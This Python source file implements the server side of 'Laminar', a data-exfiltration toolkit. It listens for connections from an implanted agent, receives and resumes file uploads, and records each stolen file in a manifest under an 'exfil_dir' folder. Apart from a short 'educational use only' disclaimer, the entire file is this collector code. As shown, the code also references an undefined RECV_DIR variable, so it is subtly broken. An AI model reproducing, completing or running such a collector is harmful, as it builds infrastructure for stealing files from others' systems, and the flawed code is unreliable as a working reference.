#!/usr/bin/env python3
"""
---------------------------------------------------------------------------
Linux Exfiltration Collector "Laminar" @4quarks
---------------------------------------------------------------------------
Summary:
Server-side receiver for Laminar agent uploads. Accepts multiple inbound
connections, resumes interrupted transfers, and writes incoming files
safely to disk with manifest logging

Key Features:
- TCP listener for concurrent client uploads
- Uses client-provided offset to avoid retransmitting
- Safe filename mapping (hash-based) to prevent collisions and path traversal

Note:
Protocol (big-endian/network order):
  -> 'HEAD' + u32 path_len + path_bytes + u64 file_size
  <- 'OKOF' + u64 offset_already_have
  -> (seek to offset) then repeat:
        'DATA' + u32 chunk_len + chunk_bytes
     until total bytes sent == file_size
  -> 'EOF!'
  <- 'DONE'

Warning:
- This code is for for educational and authorized use only. Do not use on 
  systems you do not own or have explicit permission to operate on.
"""

import os
import socket
import struct
import hashlib
import csv
import time
import argparse

# Limit chunk size
CHUNK_MAX = 64 * 1024  # 64 KiB

def safe_name(path: str) -> str:
    # Use filename.MD5hash.status as filename to ensure uniqueness
    h = hashlib.md5(path.encode()).hexdigest()
    base = os.path.basename(path).replace(os.sep, "_") or "file"
    # ".part" extension marks that the file is incomplete
    return f"{base}.{h}.part"

def append_manifest(safe_filename: str, original_path: str):
    # Add exfiltrated document in the manifest file
    with open(MANIFEST_PATH, "a", encoding="utf-8", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([safe_filename, original_path])

def recv_exact(conn: socket.socket, num_bytes: int) -> bytes:
    buf = bytearray()
    # Loop untill all bytes are read
    while len(buf) < num_bytes:
        # Number of bytes we still need from the socket connection
        chunk = conn.recv(num_bytes - len(buf))
        # No bytes means that connection has been closed, otherwise it waits
        if not chunk:
            raise ConnectionError("peer closed during recv_exact")
        buf.extend(chunk)
    return bytes(buf)

def handle_connection(conn: socket.socket):
    # Reads a series of file transfers on the same TCP connection until the client closes
    while True:
        # Read the 4-byte frame tag. If we get EOF (no bytes), close connection
        tag = conn.recv(4)
        if not tag:
            return

        if tag != b'HEAD':
            # We always expect HEAD to start a new file
            raise ValueError(f"Unexpected frame {tag!r}; expected b'HEAD'")

        # Parse HEAD
        (path_len,) = struct.unpack("!I", recv_exact(conn, 4)) # File path length
        path_bytes = recv_exact(conn, path_len)
        path = path_bytes.decode("utf-8", errors="strict") # File path
        (expected_size,) = struct.unpack("!Q", recv_exact(conn, 8)) # File size

        # Determine target filename and current offset (resume point)
        filename = safe_name(path)
        filepath = os.path.join(RECV_DIR, filename)
        # Write mapping before transfer starts
        append_manifest(filename, path)

        dest_path = os.path.join(RECV_DIR, filename)

        # If a partial exists we continue appending at its current size
        offset = 0
        if os.path.exists(filepath):
            offset = os.path.getsize(filepath)
            # If more data than the file size defined in HEAD we truncate 
            if offset > expected_size:
                with open(filepath, "rb+") as f:
                    f.truncate(expected_size)
                offset = expected_size

        # Server received the file chunk so can receive the next one
        conn.sendall(b'OKOF' + struct.pack("!Q", offset))

        # Append until we reach expected_size
        start_time = time.time()
        received = offset
        with open(filepath, "ab", buffering=0) as outf:
            while received < expected_size:
                # Each chunk must be preceded by a DATA tag + length
                tag = recv_exact(conn, 4)
                if tag != b'DATA':
                    raise ValueError(f"Unexpected frame {tag!r}; expected b'DATA'")

                (chunk_len,) = struct.unpack("!I", recv_exact(conn, 4))
                if chunk_len > CHUNK_MAX:
                    # Protects memory and enforces protocol sanity
                    raise ValueError(f"DATA chunk too large: {chunk_len} > {CHUNK_MAX}")

                chunk = recv_exact(conn, chunk_len)
                outf.write(chunk)
                received += len(chunk)

        # After we've read the expected_size bytes we expect the EOF
        tag = recv_exact(conn, 4)
        if tag != b'EOF!':
            raise ValueError(f"Expected EOF! after file {tag!r}")

        # Acknowledge completion of this file
        conn.sendall(b'DONE')

        # Mark as fully received by switching extension.
        if received == expected_size and filepath.endswith(".part"):
            done_name = filepath[:-5] + ".done"  # replace .part -> .done
            try:
                os.replace(filepath, done_name)
            except OSError:
                pass

        duration = time.time() - start_time
        speed_mbs = (expected_size - offset) / 1_000_000 / duration
        print(f"[COLLECTOR] Received {path} ({expected_size} bytes in {duration:.2f}s -> {speed_mbs:.2f} MB/s) with resume offset {offset}")

def parse_args():
    p = argparse.ArgumentParser(description="Laminar Collector")
    p.add_argument("--bind", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    p.add_argument("--port", type=int, default=8889, help="TCP port to listen on (default: 8889)")
    p.add_argument("--recv-dir", default="exfil_dir", help="Directory to store received files (default: exfil_dir)")
    p.add_argument("--manifest", default="manifest.csv", help="Manifest file to list exfiltrated files (default: manifest.csv)")
    return p.parse_args()

def main():
    args = parse_args()
    bind_host = args.bind
    bind_port = args.port
    recv_dir = args.recv_dir
    manifest_file = args.manifest
    global MANIFEST_PATH 
    MANIFEST_PATH = os.path.join(recv_dir, manifest_file)

    os.makedirs(recv_dir, exist_ok=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        # Allow quick restarts on the same port
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((bind_host, bind_port))
        srv.listen()
        print(f"[COLLECTOR] Listening on {bind_host}:{bind_port} (recv dir: {recv_dir})")

        while True:
            conn, addr = srv.accept()
            print(f"[COLLECTOR] Connection from {addr}")
            try:
                handle_connection(conn)
            except Exception as e:
                print(f"[COLLECTOR] Error: {e}")
            finally:
                try:
                    conn.close()
                except Exception:
                    pass
            print("[COLLECTOR] Connection closed")

if __name__ == "__main__":
    main()

